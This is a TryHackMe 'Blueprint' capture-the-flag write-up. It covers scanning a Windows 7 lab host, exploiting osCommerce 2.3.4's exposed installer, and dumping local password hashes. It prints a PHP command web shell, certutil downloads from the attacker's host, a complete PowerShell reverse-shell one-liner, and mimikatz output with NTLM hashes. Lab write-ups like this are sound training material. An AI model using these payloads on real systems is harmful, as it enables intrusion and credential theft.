```bash
# PLATFORM          . THM
# CTF NAME          . Blueprint
# DESCRIPTION       . Hack into this Windows machine and escalate your privileges to Administrator.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/blueprint
```

```
sudo nmap -sSVC -T5 -PN 10.10.81.40 -oN blueprint
```

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
```

- Both `443` and `8080` ports seem to run the same web application. However, the application doesn't seem properly configured and we get access to some documentation, the database schema and to a HTML only front end of the app.

- I decided to spend some time reading about this app, `oscommerce`. I found out that the install process is happening in `/oscommerce-2.3.4/catalog/install/install.php` and we can append `?step=` to skip to whatever installation step we want.

- I also found out that this `/install` directory should be removed after the installation is finished, as it represents a potential attack vector, since an unauthorized person can "reinstall" the page  - more exactly, step 4 of the installation process. This will (re)generate the .php config file - which the app doesn't check to see if it already exists or not - and an attacker an inject code into this config file.

- So this is when decided to check `exploit-db` for CVEs.

- I found [this](https://www.exploit-db.com/exploits/44374) and [this](https://www.exploit-db.com/exploits/50128). I tried modifying the first script to run on `2.3.4` and it did ok ; I used a PHP reverse shell as the payload and it ... almost worked??? 

- My netcat listener would receive the connection and then close instantly. I used `-k` to keep it alive, but i think it was still killed in the background, as the "shell" wasn't responding to any commands. 

- Decided to upload a simple cmd php shell. - `<?php echo shell_exec($_GET["cmd"]); ?>`

- Using the payload below, I've transferred it to the target webserver using the script above.

```
shell_exec("certutil -urlcache -split -f http://10.11.53.46:80/shell.php shell.php");'
```

- I got a reverse shell using a powershell one liner, URL encoded in the `/shell.php?cmd=` URL.

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ip',3131);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- The flag is located at `C:\Users\Administrator\Desktop\root.txt.txt`.

- The CTF asks for the password hash of user "Lab". We can dump that using mimikatz.

- I transferred mimikatz on the target machine using

```
certutil -urlcache -split -f "http://IP:80/mimikatz.exe" mimikatz.exe
```

- Commands like `Invoke-RestMethod` and `Invoke-WebRequest` did not seem to be working.

- Using `.\mimikatz.exe "lsadump::sam" exit` 

```
mimikatz(commandline) # lsadump::sam
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 549a1bcb88e35dc18c7a0b0168631411

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 30e87bf999828446a1c1209ddde4c450

mimikatz(commandline) # exit
Bye!
```

**PS**: hash can be cracked using crackstation. 